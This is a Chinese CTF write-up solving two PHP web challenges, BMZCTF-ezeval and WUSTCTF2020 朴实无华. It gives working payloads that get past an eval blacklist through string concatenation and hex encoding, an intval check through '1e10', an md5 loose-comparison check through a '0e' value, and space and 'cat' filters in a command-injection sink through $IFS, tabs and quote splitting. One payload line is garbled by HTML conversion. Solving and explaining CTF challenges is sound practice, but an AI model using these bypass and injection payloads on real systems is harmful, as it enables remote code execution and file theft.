日常练习：BMZCTF-ezeval / [WUSTCTF2020]朴实无华1

 **BMZCTF-ezeval**  
源代码：

![](https://image.3001.net/images/20220330/1648642187_6244488b44d0b3c74e4ca.png!small)

 **分析：**
我们通过POST方式，向cmd提交内容，然后cmd经过htmlsmecialchars()过滤，再使用str_ireplace()经过黑名单black_list再过滤一次，最后eval()来执行cmd参数的内容；

其中，str_ireplace(find，replace，string, count)函数；就是做替换的函数，可以指定替换内容中的哪一部分，比如：

![](https://image.3001.net/images/20220330/1648642187_6244488bc52b9a5eaf7d8.png!small)

然后对于这道题，我们发现array里面过滤了很多函数，乍一看暂时想不到利用的方法，但其实我们很容易就可以绕过。分享以下两种解法：

1.PHP里面，可以用'.'来进行前后内容的拼接；

2.可以考虑对一个东西进行编码尝试；

也就是对应的：

    
    
    ?cmd=(s.y.s.t.e.m)(cat /flag); //黑名单system分成用'.'来进行拼接的；
    
    
    ?cmd=hexbin(73797374656d)(cat /flag); //对照ascii码表把system每个字母的ascii码值连在一起；

于是先用ls /得到flag的位置，再去cat获取flag：

![](https://image.3001.net/images/20220330/1648642188_6244488c24c6934f7ee14.png!small)

![](https://image.3001.net/images/20220330/1648642188_6244488c90856267cb267.png!small)

![](https://image.3001.net/images/20220330/1648642188_6244488cf3ffe1faa598e.png!small)

这道题尝试用echo以及exec，但是由于htmlspecialchars对实体符号的限制，暂时利用不了，也可能我想的不够全面，后面再看看有没有其它利用方法；

 **[WUSTCTF2020]朴实无华1**  
打开题目，就一个hack me，尝试看看存不存在robots.txt，果然存在东西，访问/fAke_f1agggg.php

![](https://image.3001.net/images/20220330/1648642189_6244488d688f868e94973.png!small)

结果给了个假的flag，那包里边应该会存在内容，尝试抓包看一下；

![](https://image.3001.net/images/20220330/1648642189_6244488dba4fb7193804c.png!small)

我们可以看到藏了个/fl4g.php，访问一下得到源代码;

![](https://image.3001.net/images/20220330/1648642190_6244488e1d12420e77b8a.png!small)

 **一共有3个level的过滤：**

![](https://image.3001.net/images/20220330/1648642190_6244488e8a2df9ec391cd.png!small)
**1\.
level_1：**![](https://image.3001.net/images/20220330/1648642190_6244488ee072a63cfa9f8.png!small)

分析：level_1是针对intval()的过滤,当我们的intval()括号内是一个string的数字和字符串混合内容时，则返回的是这串内容的第一位数字，而当我们对这个字符型的内容进行加减乘除操作的时候，这串字符则会对应地转换为int或者double类型；  
比如：![](https://image.3001.net/images/20220330/1648642191_6244488f439e1d7f37832.png!small)

满足了我们的 **num** **既要小于2020，还要在加1后大于2021** ，那么我们便可以通过 **?num=1e10** 来绕过，得到：

![](https://image.3001.net/images/20220330/1648642191_6244488fa78e90afad2e0.png!small)

 **2\. level_2** **：**

![](https://image.3001.net/images/20220330/1648642191_6244488ff11d4c01d47a7.png!small)
分析：level_2是php弱类型比较；（感觉还带了点md5碰撞问题的样子），这里我们需要知道'=='两个等号做比较的时候，会先将左右两边的内容转换为同一种类型的内容再进行比较。而在php中，如果有一串内容以0e开头，那么这串内容会以科学计数法的形式表示，而0的次方就是0。所以，我们的思路就是通过找到一个0e开头的值，且md5加密后的内容也是0e开头的，使得条件为真。  
那么找到了满足条件的值： **0e215962017** ，拼在level_1的poc后边儿 **?num=1e10
&md5=0e215962017**得到：

![](https://image.3001.net/images/20220330/1648642192_624448905a55c86535376.png!small)

 **3\. level_3** **：**

![](https://image.3001.net/images/20220330/1648642192_62444890b0aec9570c8d6.png!small)
分析：最终是先通过strstr()过滤了空格，再通过str_ireplace()过滤cat参数，空格和这种简单过滤字符串的绕过很简单，举几个例子：

![](https://image.3001.net/images/20220330/1648642193_6244489119afe73c6bdea.png!small)

OK，回到这个题，我们先ls一下，看到了flag的那一坨名字：

![](https://image.3001.net/images/20220330/1648642193_6244489186b70e40adc8a.png!small)最后结合上方的例子，可以得到一下几种poc（为了方便看，我就把那一长串名字简写成flag）：

    
    
    ?num=1e10&md5=0e215962017&get_flag=ca""t%09flag
    
    
    ?num=1e10&md5=0e215962017&get_flag=ca\t%09flag
    
    
    ?num=1e10&md5=0e215962017&get_flag=ca""t<flag< code=""></flag<>
    
    
    ?num=1e10&md5=0e215962017&get_flag=ca""t$IFS$9flag
    
    
    ?num=1e10&md5=0e215962017&get_flag=ca""t$IFS$1flag
    
    
    ?num=1e10&md5=0e215962017&get_flag=ca""t${IFS}$1flag

`最终拿到flag:`

![](https://image.3001.net/images/20220330/1648642194_624448929eb0766b6b347.png!small)

 **作者** | 枫涧

 **编辑** | 楌橪

